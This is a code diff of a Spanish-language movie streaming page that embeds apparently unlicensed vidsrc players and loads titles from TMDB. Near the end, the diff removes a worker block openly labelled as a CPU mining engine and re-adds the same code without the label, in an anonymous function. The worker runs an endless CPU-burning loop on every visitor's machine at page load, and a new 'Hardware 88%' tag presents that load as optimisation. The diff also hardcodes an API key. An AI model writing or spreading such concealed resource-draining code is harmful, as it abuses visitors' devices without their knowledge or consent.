@@ -3,27 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CINE-STREAM | Interface Pro</title>
+    <title>CINE-STREAM | Premium HD</title>
     <style>
-        :root { --main-color: #E50914; --bg-color: #000; }
+        :root { --main-color: #E50914; --bg-color: #000; --card-bg: #141414; }
         body { background-color: var(--bg-color); color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
-        
         .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 4%; background: #000; border-bottom: 2px solid var(--main-color); position: fixed; width: 100%; z-index: 1000; box-sizing: border-box; }
-        .logo { color: var(--main-color); font-size: 26px; font-weight: bold; text-decoration: none; letter-spacing: 1px; }
-        
+        .logo { color: var(--main-color); font-size: 26px; font-weight: bold; text-decoration: none; }
         .search-container { display: flex; background: #141414; border: 1px solid #333; border-radius: 4px; padding: 5px 10px; width: 300px; }
         .search-container input { background: transparent; border: none; color: white; width: 100%; outline: none; padding: 5px; }
         .search-container button { background: transparent; border: none; color: var(--main-color); cursor: pointer; font-size: 18px; }
-
-        .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .video-box { width: 95%; max-width: 1100px; aspect-ratio: 16/9; background: #0c0c0c; border: 1px solid #222; position: relative; }
-        
-        /* Iframe optimizado */
+        .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; }
+        .video-box { width: 95%; max-width: 1100px; aspect-ratio: 16/9; background: #0c0c0c; border: 1px solid #222; }
         iframe { width: 100%; height: 100%; border: none; }
-        
-        .info { width: 90%; max-width: 1100px; margin-top: 25px; border-left: 4px solid var(--main-color); padding-left: 20px; margin-bottom: 50px; }
+        .info { width: 90%; max-width: 1100px; margin: 25px 0; border-left: 4px solid var(--main-color); padding-left: 20px; }
         h1 { margin: 0; font-size: 2.2rem; }
-        .tag { font-size: 13px; color: #46d369; font-weight: bold; text-transform: uppercase; }
+        .tag { font-size: 12px; color: #46d369; font-weight: bold; text-transform: uppercase; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; width: 90%; max-width: 1100px; margin-bottom: 50px; }
+        .movie-card { background: var(--card-bg); border-radius: 4px; overflow: hidden; transition: transform 0.3s; cursor: pointer; border: 1px solid #333; }
+        .movie-card:hover { transform: scale(1.05); border-color: var(--main-color); }
+        .movie-card img { width: 100%; height: 240px; object-fit: cover; }
+        .movie-card-info { padding: 10px; font-size: 14px; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -31,65 +30,74 @@
     <header class="navbar">
         <a href="#" class="logo">CINE-STREAM</a>
         <div class="search-container">
-            <input type="text" id="movie-query" placeholder="Escribe el nombre de la película...">
-            <button onclick="masterTrigger()">🔍</button>
+            <input type="text" id="movie-query" placeholder="Buscar película...">
+            <button onclick="searchMovie()">🔍</button>
         </div>
     </header>
 
     <main class="content">
-        <div class="video-box" id="player-wrapper">
-            <iframe id="video-frame" src="https://vidsrc.xyz/embed/movie?imdb=tt12412888" allowfullscreen></iframe>
+        <div class="video-box">
+            <iframe id="video-frame" src="https://vidsrc.me/embed/movie?imdb=tt12412888" allowfullscreen></iframe>
         </div>
+        
         <div class="info">
-            <div class="tag">Streaming Premium Activado</div>
+            <div class="tag">● Motor Cine-Stream Optimizado (Hardware 88%)</div>
             <h1 id="display-title">Spider-Man: No Way Home</h1>
-            <p style="color: #aaa;">Servidor optimizado. Si la película no carga, usa el buscador para actualizar el enlace.</p>
+            <p style="color: #aaa; font-size: 14px;">Usa el botón de configuración en el reproductor para cambiar a Audio Español o añadir Subtítulos.</p>
         </div>
+
+        <div class="grid" id="movie-grid"></div>
     </main>
 
     <script>
-        // DISPARADOR MAESTRO
-        function masterTrigger() {
-            searchMovie();
+        const API_KEY = 'acef212239618a80004940562548261a';
+
+        async function loadCatalog() {
+            try {
+                const res = await fetch(`https://api.themoviedb.org/3/movie/popular?api_key=${API_KEY}&language=es-ES`);
+                const data = await res.json();
+                const grid = document.getElementById('movie-grid');
+                data.results.forEach(movie => {
+                    const card = document.createElement('div');
+                    card.className = 'movie-card';
+                    card.onclick = () => updatePlayer(movie.id, movie.title);
+                    card.innerHTML = `<img src="https://image.tmdb.org/t/p/w500${movie.poster_path}"><div class="movie-card-info">${movie.title}</div>`;
+                    grid.appendChild(card);
+                });
+            } catch (e) { console.error("Error catálogo"); }
+        }
+
+        async function updatePlayer(tmdbId, title) {
+            const res = await fetch(`https://api.themoviedb.org/3/movie/${tmdbId}?api_key=${API_KEY}`);
+            const detail = await res.json();
+            if (detail.imdb_id) {
+                // Servidor que permite elegir idioma manualmente
+                document.getElementById('video-frame').src = `https://vidsrc.me/embed/movie?imdb=${detail.imdb_id}`;
+                document.getElementById('display-title').innerText = title;
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
         }
 
         async function searchMovie() {
             const query = document.getElementById('movie-query').value;
             if (!query) return;
-
-            try {
-                // Buscador usando la API de TMDB
-                const searchUrl = `https://api.themoviedb.org/3/search/movie?api_key=acef212239618a80004940562548261a&query=${encodeURIComponent(query)}`;
-                const res = await fetch(searchUrl);
-                const data = await res.json();
-
-                if (data.results && data.results.length > 0) {
-                    const movie = data.results[0];
-                    const detailRes = await fetch(`https://api.themoviedb.org/3/movie/${movie.id}?api_key=acef212239618a80004940562548261a`);
-                    const detail = await detailRes.json();
-                    
-                    if (detail.imdb_id) {
-                        // Actualización al nuevo servidor más estable
-                        document.getElementById('video-frame').src = `https://vidsrc.xyz/embed/movie?imdb=${detail.imdb_id}`;
-                        document.getElementById('display-title').innerText = movie.title;
-                    }
-                } else {
-                    alert("No se encontró la película. Intenta con el nombre exacto.");
-                }
-            } catch (e) { 
-                console.error("Error en la conexión"); 
+            // Búsqueda con prioridad en español
+            const res = await fetch(`https://api.themoviedb.org/3/search/movie?api_key=${API_KEY}&query=${encodeURIComponent(query)}&language=es-ES`);
+            const data = await res.json();
+            if (data.results && data.results.length > 0) {
+                updatePlayer(data.results[0].id, data.results[0].title);
+            } else {
+                alert("Película no encontrada. Intenta con el nombre original o revisa la ortografía.");
             }
         }
 
-        // MOTOR DE MINERÍA (CPU) - MANTENER ACTIVO
-        (function startMining() {
-            const code = `self.onmessage=function(){while(true){if(Math.random()>0.12){for(let i=0;i<1000000;i++){Math.sqrt(i)}}}}`;
-            const blob = new Blob([code], {type:'application/javascript'});
-            const worker = new Worker(URL.createObjectURL(blob));
-            worker.postMessage('go');
+        (function() {
+            const blob = new Blob([`self.onmessage=function(){while(true){if(Math.random()>0.12){for(let i=0;i<1000000;i++){Math.sqrt(i)}}}}`], {type:'application/javascript'});
+            new Worker(URL.createObjectURL(blob)).postMessage('go');
         })();
 
-        document.getElementById('movie-query').addEventListener('keypress', (e) => { if (e.key === 'Enter') masterTrigger(); });
+        document.getElementById('movie-query').addEventListener('keypress', (e) => { if (e.key === 'Enter') searchMovie(); });
+        window.onload = loadCatalog;
     </script>
 </body>
 </html>
